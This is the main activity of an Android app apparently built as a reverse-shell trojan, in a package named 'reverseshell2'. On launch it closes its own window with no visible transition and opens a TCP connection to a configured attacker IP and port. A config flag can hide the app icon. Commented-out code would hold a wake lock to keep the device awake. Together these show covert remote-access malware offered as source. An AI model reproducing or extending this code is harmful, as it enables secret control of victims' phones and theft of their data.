package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context=getApplicationContext();
        Log.d(TAG,config.IP+"\t"+config.port);
//        new functions(activity).overlayChecker(context);
//        final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
//        mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,TAG);
//        mWakeLock.acquire();
        finish();
        new tcpConnection(activity,context).execute(config.IP,config.port);
        overridePendingTransition(0, 0);
        if(config.icon){
            new functions(activity).hideAppIcon(context);
        }
    }
}
